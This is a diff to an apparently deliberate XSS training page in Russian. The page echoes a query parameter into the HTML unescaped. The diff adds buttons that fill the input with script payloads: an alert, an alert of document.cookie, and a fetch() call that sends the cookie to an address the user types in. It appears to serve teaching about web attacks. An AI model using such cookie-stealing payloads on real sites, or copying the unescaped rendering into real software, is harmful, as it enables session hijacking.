@@ -9,8 +9,34 @@
     <h1>XSS уязвимость с кодированием</h1>
     <p>Введенный текст: {{ query }}</p>
     <form method="GET">
-        <input type="text" name="query">
+        <textarea name="query" id="query" cols="100" rows="5"></textarea>
         <input type="submit">
     </form>
+    <h3> Автозаполнение инъекций </h3> <br />
+    <button onclick="simple_alert()">Простой alert()</button><br />
+    <button onclick="alert_cookie()">Куки в alert()</button><br />
+    <input type="text" id="steal_address" placeholder="Send cookies to" style="width: 300px;">
+    <button onclick="steal_cookie()">Кража cookie</button>
+
+    <script>
+        function simple_alert() {
+            const inputField = document.getElementById("query");
+            const valueToInsert = "<script>alert(1)<\/script>";
+            inputField.value = valueToInsert;
+        }
+
+        function alert_cookie() {
+            const inputField = document.getElementById("query");
+            const valueToInsert = "<script>alert(document.cookie)<\/script>";
+            inputField.value = valueToInsert;
+        }
+
+        function steal_cookie() {
+            const inputField = document.getElementById("query");
+            const steal_address = document.getElementById("steal_address").value;
+            const valueToInsert = '<script>fetch("' + steal_address + '/" + document.cookie)<\/script>';
+            inputField.value = valueToInsert;
+        }
+    </script>
 </body>
 </html>
